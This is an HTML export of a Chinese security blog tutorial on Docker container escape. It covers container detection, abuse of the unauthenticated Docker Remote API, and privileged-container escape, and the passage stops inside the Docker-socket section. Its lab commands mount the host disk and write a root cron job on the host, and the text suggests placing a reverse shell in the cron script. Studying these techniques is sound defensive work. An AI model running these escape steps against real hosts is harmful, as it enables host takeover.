@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="概念云原生概念：云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式API。 而云原生安全也就是围绕上述几类技术和衍生技术进行楼哦对那个挖掘和利用。攻击路径参考 CIS20220 上总结的攻击模型：   安全问题基于以上的云原生以及云原生安全，总结出以下可能的安全问题：  传统安全问题依然存在 传统web入侵、DDOS攻击等依然存在，甚至会因为云上架构复杂，组件直接的调用增多造成更多">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker容器逃逸">
+<meta property="og:url" content="http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="概念云原生概念：云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式API。 而云原生安全也就是围绕上述几类技术和衍生技术进行楼哦对那个挖掘和利用。攻击路径参考 CIS20220 上总结的攻击模型：   安全问题基于以上的云原生以及云原生安全，总结出以下可能的安全问题：  传统安全问题依然存在 传统web入侵、DDOS攻击等依然存在，甚至会因为云上架构复杂，组件直接的调用增多造成更多">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143648473.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143936032.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302144614060.png">
+<meta property="article:published_time" content="2024-03-02T08:50:14.000Z">
+<meta property="article:modified_time" content="2024-03-02T08:53:17.956Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="云原生安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143648473.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Docker容器逃逸</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/28/CNSS-2023-Recruit-Reverse-EASY-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&text=Docker容器逃逸"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&is_video=false&description=Docker容器逃逸"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Docker容器逃逸&body=Check out this article: http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&name=Docker容器逃逸&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&t=Docker容器逃逸"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">安全问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">3.</span> <span class="toc-text">容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">3.2.1.</span> <span class="toc-text">检测容器环境</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.1.0.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-API-%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.2.</span> <span class="toc-text">基于 API 漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E8%BF%9C%E7%A8%8BAPI-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Docker 远程API 未授权访问逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.2.2.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.3.</span> <span class="toc-text">基于危险配置的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E8%BF%90%E8%A1%8C%E5%AE%B9%E5%99%A8"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">privileged特权模式运行容器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">3.2.3.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.4.</span> <span class="toc-text">基于危险挂载的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-Docker-Socket-%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">挂载 Docker Socket 的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">3.2.4.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA-procfs-%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">挂载宿主机 procfs 的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">3.2.4.2.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.5.</span> <span class="toc-text">基于程序漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-runC%E9%80%83%E9%80%B8-CVE-2019-5736"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">Docker runC逃逸-CVE-2019-5736</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.6.</span> <span class="toc-text">基于内核漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%8F%E7%AE%A1%E9%81%93-CVE-2022-0847-Dirty-Pipe"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">脏管道(CVE-2022-0847) Dirty Pipe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Docker容器逃逸
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-02T08:50:14.000Z" class="dt-published" itemprop="datePublished">2024-03-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a> › <a class="category-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/">容器安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/docker/" rel="tag">docker</a>, <a class="p-category" href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/" rel="tag">云原生安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>云原生概念：云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式API。</p>
+<p>而云原生安全也就是围绕上述几类技术和衍生技术进行楼哦对那个挖掘和利用。攻击路径参考 CIS20220 上总结的攻击模型：</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143648473.png" alt="image-20240302143648473" style="zoom: 33%;" />
+
+<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>基于以上的云原生以及云原生安全，总结出以下可能的安全问题：</p>
+<ul>
+<li>传统安全问题依然存在<ul>
+<li>传统web入侵、DDOS攻击等依然存在，甚至会因为云上架构复杂，组件直接的调用增多造成更多安全问题；</li>
+</ul>
+</li>
+<li>API 安全<ul>
+<li>云原生架构中，内部组件和微服务的调用普遍使用API，由此带来的安全问题也逐渐增多</li>
+</ul>
+</li>
+<li>容器安全<ul>
+<li>容器镜像安全，如容器逃逸等，可以直接从容器跳到宿主机</li>
+</ul>
+</li>
+<li>···</li>
+</ul>
+<h1 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>本质上容器内的进程只是一个受限的普通Linux进程，容器内部进程的所有行为对于宿主机来说是透明的。我们可以很容易地在宿主机以哦那个ps看到容器的进程信息。</p>
+<p>所以，容器逃逸和硬件虚拟化逃逸的本质有很大的不同(不包含 Kata Containers 等 )，容器逃逸的过程更像一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup&#x2F;Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。</p>
+<p>而该漏洞利用思路是：</p>
+<ul>
+<li>检测是否处于容器环境</li>
+<li>进行容器逃逸<ul>
+<li>基于API 漏洞</li>
+<li>基于危险配置</li>
+<li>基于危险挂载</li>
+<li>基于程序漏洞</li>
+<li>基于内核漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="检测容器环境"><a href="#检测容器环境" class="headerlink" title="检测容器环境"></a>检测容器环境</h3><p>参考 Metasploit 中检测 container 的模块(checkcontainer、checkvm)。</p>
+<ol>
+<li>检查<code>/proc/1/cgroup</code>内是否包含<code>&quot;docker&quot;</code>或<code>&quot;kubepods&quot;</code>等字符串 （虚拟机环境下也存在一些特征，感觉是主要检测方法）</li>
+<li>检查<code>/.dockerenv</code>文件是否存在 （虚拟机环境下无 <code>dockerenv </code>）</li>
+<li>检查环境变量 （k8s 环境下有很多特征环境变量）</li>
+<li>检查 <code>mount</code> 信息</li>
+<li>查看硬盘信息 （<code>fdisk -l </code>容器输出为空，非容器有内容输出。）</li>
+</ol>
+<h5 id="docker-容器复现"><a href="#docker-容器复现" class="headerlink" title="docker 容器复现"></a><strong>docker 容器复现</strong></h5><p>​	测试环境 ：<code>docker nginx:latest</code> 镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">~/docker<span class="comment"># docker run -it nginx /bin/bash</span></span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># ls -a</span></span><br><span class="line">.   .dockerenv  boot  docker-entrypoint.d   etc   lib    media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         dev   docker-entrypoint.sh  home  lib64  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># env</span></span><br><span class="line">HOSTNAME=a9252d978133</span><br><span class="line">PWD=/</span><br><span class="line">PKG_RELEASE=1~bookworm</span><br><span class="line">HOME=/root</span><br><span class="line">NJS_VERSION=0.8.3</span><br><span class="line">TERM=xterm</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">NGINX_VERSION=1.25.4</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># mount | grep &#x27;/ type&#x27;</span></span><br><span class="line">overlay on / <span class="built_in">type</span> overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/LPKZRVTP753VVXKM3ARZUK5OR2:/var/lib/docker/overlay2/l/AR7676WYAQNJS24WTSN5XA7V2I:/var/lib/docker/overlay2/l/DJKBU2ILQ2JIDHBVK4QMCXBSA7:/var/lib/docker/overlay2/l/JRSTI6UYS62A736CLJZFI6NNDO:/var/lib/docker/overlay2/l/6NPGO2PXGP3TVCVUCHWONBNIJF:/var/lib/docker/overlay2/l/BHLVJVJ5LD4VISES4VI6QFBGNN:/var/lib/docker/overlay2/l/XUYCWER26LYZCXFWJNF26X2HLC:/var/lib/docker/overlay2/l/KRKBYSDIT6JVAD7EUXOGIGYDXK,upperdir=/var/lib/docker/overlay2/ab464eeafa5120fc43e39033f5ee47577384378633d654b18009df07c55a81b3/diff,workdir=/var/lib/docker/overlay2/ab464eeafa5120fc43e39033f5ee47577384378633d654b18009df07c55a81b3/work)</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># fdisk -l</span></span><br><span class="line">bash: fdisk: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，部分测试通过部分没有，但大体来讲能判断目前处于一个docker环境。</p>
+<h3 id="基于-API-漏洞的逃逸"><a href="#基于-API-漏洞的逃逸" class="headerlink" title="基于 API 漏洞的逃逸"></a>基于 API 漏洞的逃逸</h3><h4 id="Docker-远程API-未授权访问逃逸"><a href="#Docker-远程API-未授权访问逃逸" class="headerlink" title="Docker 远程API 未授权访问逃逸"></a><strong>Docker 远程API 未授权访问逃逸</strong></h4><p>该漏洞起因是因为使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375&#x2F;2376，绑定在0.0.0.0上，http访问会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令，比如访问 <code>http://x.x.x.x:2375/containers/json</code> 会返回服务器当前运行的 container 列表，和在 docker CLI 上执行 docker ps 的效果一样，其他操作比如创建&#x2F;删除 container，拉取 image 等操作也都可以通过API调用完成。</p>
+<h5 id="docker-容器复现-1"><a href="#docker-容器复现-1" class="headerlink" title="docker 容器复现"></a>docker 容器复现</h5><ul>
+<li>在配置Docker启动文件(<code>/usr/lib/systemd/system/docker.service)</code>时，添加允许任何网段访问<code>Docker Remote API</code></li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143936032.png" alt="image-20240302143936032" style="zoom: 25%;" />
+
+<ul>
+<li><p>重启 Docker：<code>sudo systemctl daemon-reload;sudo service docker restart</code></p>
+</li>
+<li><p>验证存在漏洞</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@VM<span class="number">-8</span><span class="number">-4</span>-debian:/docker-test<span class="meta"># docker run --rm -ti ubuntu bash</span></span><br><span class="line">root@ff7d66f8c120:/# IP=`hostname -i | awk -F. <span class="string">&#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27;</span> ` &amp;&amp; timeout <span class="number">3</span> bash -c <span class="string">&quot;echo &gt;/dev/tcp/$IP/2375&quot;</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;&amp; echo <span class="string">&quot;Docker Remote API Is Enabled.&quot;</span> || echo <span class="string">&quot;Docker Remote API is Closed.&quot;</span></span><br><span class="line">Docker Remote API Is Enabled.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在本地利用该 API 创建容器并挂载逃逸(后面有示例)：<code>docker -H tcp://x.x.x.x:2375 run -it -v /docker-test:/test ubuntu /bin/bash</code></li>
+</ul>
+<h3 id="基于危险配置的逃逸"><a href="#基于危险配置的逃逸" class="headerlink" title="基于危险配置的逃逸"></a>基于危险配置的逃逸</h3><h4 id="privileged特权模式运行容器"><a href="#privileged特权模式运行容器" class="headerlink" title="privileged特权模式运行容器"></a><strong>privileged特权模式运行容器</strong></h4><p>最初，容器特权模式的出现是为了帮助开发者实现Docker-in-Docker特性。然而，在特权模式下运行不完全受控容器将给宿主机带来极大安全威胁。</p>
+<blockquote>
+<p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p>
+</blockquote>
+<p>在这样的场景下，从容器中逃逸出去时易如反掌的。例如：攻击者可以直接在容器内部挂载宿主机磁盘，然后将根目录切换过去。</p>
+<h5 id="docker-容器复现-2"><a href="#docker-容器复现-2" class="headerlink" title="docker 容器复现"></a>docker 容器复现</h5><ul>
+<li>漏洞验证</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@VM-8-4-debian:~<span class="comment"># docker exec -it 18a16c0e62f0  /bin/bash</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># cat /proc/self/status |grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 000001ffffffffff</span><br><span class="line">CapEff: 000001ffffffffff</span><br><span class="line">CapBnd: 000001ffffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 CapEff 对应的掩码值为 <code>0000001fffffffff</code>   （ps：搜出来的blog写的是<code>0000003fffffffff</code> 不过后面也能挂载，问题不大。）</p>
+<ul>
+<li>转义</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@18a16c0e62f0:/<span class="comment"># capsh --decode=0000001fffffffff</span></span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>漏洞利用</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@18a16c0e62f0:/<span class="comment"># fdisk -l</span></span><br><span class="line">	···</span><br><span class="line">Device     Boot Start       End   Sectors Size Id Type</span><br><span class="line">/dev/vda1  *     2048 125829086 125827039  60G 83 Linux</span><br><span class="line"></span><br><span class="line">root@18a16c0e62f0:/<span class="comment">#mkdir /test</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment">#mount /dev/vda1 /test</span></span><br><span class="line"></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># touch /test/test.sh</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># echo &quot;111&quot; &gt; /test/test.sh</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># echo &quot;* * * * * root bash /test.sh&quot; &gt;&gt; /test/etc/crontab</span></span><br><span class="line"></span><br><span class="line">root@VM-8-4-debian:~<span class="comment"># cat /etc/crontab</span></span><br><span class="line">	···</span><br><span class="line">* * * * * root bash /test.sh                 </span><br><span class="line"> <span class="comment">#可以看到已经写进去了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其中的 <code>test.sh</code> 我们就可以写反弹 shell 的命令</li>
+</ul>
+<blockquote>
+<p><strong>注意！注意！注意！</strong></p>
+<p>此时 <code>/test</code> 和宿主机的 <code>/</code> 被挂载在一起，删除<code>test</code>就相当于删除 <code>/</code> ！ 😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭</p>
+</blockquote>
+<h3 id="基于危险挂载的逃逸"><a href="#基于危险挂载的逃逸" class="headerlink" title="基于危险挂载的逃逸"></a>基于危险挂载的逃逸</h3><p>为了方便宿主机与虚拟机进行数据交换，几乎所有主流虚拟机解决方案都会提供挂载宿主机目录到虚拟机的功能。容器同样如此。然而，将宿主机上的敏感文件或目录挂载到容器内部——尤其是那些不完全受控的容器内部往往会带来安全问题。</p>
+<h4 id="挂载-Docker-Socket-的情况"><a href="#挂载-Docker-Socket-的情况" class="headerlink" title="挂载 Docker Socket 的情况"></a><strong>挂载 Docker Socket 的情况</strong></h4><p>Docker Socket 是 Docker 守护进程监听的 Unix 域套接字，用来与守护进程通信——查询信息或下发命令。如果在攻击者可控的容器内挂载了该套接字文件（&#x2F;var&#x2F;run&#x2F;docker.sock），可通过 Docker Socket 与 Docker 守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部，完成简单逃逸。</p>
+<blockquote>
